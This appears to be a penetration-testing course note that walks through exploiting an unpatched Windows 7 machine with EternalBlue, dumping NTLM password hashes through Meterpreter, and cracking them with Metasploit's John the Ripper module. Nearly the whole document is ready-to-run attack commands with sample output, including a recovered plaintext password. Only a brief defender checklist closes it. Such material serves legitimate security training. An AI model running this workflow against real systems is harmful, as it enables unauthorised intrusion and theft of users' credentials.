# O.R. 5.4 - How to Use John the Ripper in Metasploit to Quickly Crack Windows Hashes

## Overview

- **John the Ripper (JTR)** – a powerful password cracking tool integrated into Metasploit as a module.
- The Metasploit JTR module allows cracking Windows password hashes **directly within the framework** – no need to load JTR externally.
- **Requires:** Metasploit's PostgreSQL database (`service postgresql start`).
- **Target:** Windows 7 (unpatched) – but works on any Windows version from which hashes can be dumped.

> **Workflow:** Compromise → Get Meterpreter → Dump hashes → Store in database → Run JTR module.

---

## Step 1: Compromise the Target

### Start PostgreSQL and Metasploit

```bash
service postgresql start
msfconsole
```

### Exploit with EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set LPORT <listener_port>
run
```

**Result:** Meterpreter session opened.

---

## Step 2: Dump Hashes and Store in Database

### Get Hashes (Meterpreter `hashdump`)

```bash
meterpreter > hashdump
```

**Output Example:**
```
admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Background Session

```bash
meterpreter > background
```

### Use Hashdump Post Module (Store in DB)

```bash
use post/windows/gather/hashdump
set SESSION 1
run
```

**Output:** Hashes stored in the database. Also reveals password hints (e.g., `admin2:"shots"`).

### Verify Stored Credentials

```bash
creds
```

**Output:**
```
host         origin       service        public         private
----         ------       -------        ------         -------
10.10.0.104  10.10.0.104  445/tcp (smb)  admin2         aad3b435b... (NTLM hash)
```

---

## Step 3: Crack the Hash with JTR Module

### Load the JTR Windows Fast Module

```bash
use auxiliary/analyze/jtr_windows_fast
```

### View Options

```bash
options
```

| Option | Description |
|--------|-------------|
| `USE_CREDS` (true) | Use existing credential data from database |
| `USE_DEFAULT_WORDLIST` (true) | Use default Metasploit wordlist |
| `CUSTOM_WORDLIST` | Optional custom wordlist path |
| `KORELOGIC` (false) | Apply KoreLogic rules (slower but more effective) |
| `MUTATE` (false) | Apply common mutations to wordlist |

### Run the Module

```bash
run
```

### What JTR Does Automatically:

1. **LM Hashes:**
   - Wordlist mode
   - Single mode
   - Incremental mode (Digits)

2. **NT Hashes:**
   - Wordlist mode
   - Single mode
   - Incremental mode (Digits)

### Successful Crack Output

```
[+] Cracked Passwords this run:
[+] admin2:tequila99
```

---

## Verify Cracked Credentials

```bash
creds
```

**Updated Output:**
```
host         origin       service        public         private
----         ------       -------        ------         -------
10.10.0.104  10.10.0.104  445/tcp (smb)  admin2         tequila99
10.10.0.104  10.10.0.104  445/tcp (smb)  admin2         aad3b435b... (NTLM hash)
```

- Plaintext password is now stored alongside the hash.

---

## Quick Reference: Complete Workflow

### Step 1: Exploit & Get Meterpreter

```bash
service postgresql start
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.0.104
set LHOST 10.10.0.1
run
```

### Step 2: Dump Hashes

```bash
meterpreter > hashdump
meterpreter > background
```

### Step 3: Store Hashes in Database

```bash
use post/windows/gather/hashdump
set SESSION 1
run
creds
```

### Step 4: Crack with JTR

```bash
use auxiliary/analyze/jtr_windows_fast
run
creds
```

---

## Key Takeaways

- **Metasploit's JTR module** (`jtr_windows_fast`) cracks Windows hashes directly within the framework – no external JTR needed.
- **Requires PostgreSQL database** to store and retrieve credential data.
- **Hashdump post module** stores hashes in the database – `hashdump` alone only displays them.
- **JTR module automatically runs**: wordlist, single-mode, and incremental attacks on both LM and NT hashes.
- **Password hints** (from Windows) are also displayed – useful for guessing.
- **Optional enhancements:** Use `KORELOGIC` or `MUTATE` for more thorough cracking (slower).
- **Cracked passwords** are automatically stored alongside hashes in the database.
- **Defender mindset:** Enforce strong passwords, disable LM hash storage, enable account lockout policies, and monitor for hash dumping attempts (e.g., `hashdump` or `mimikatz`).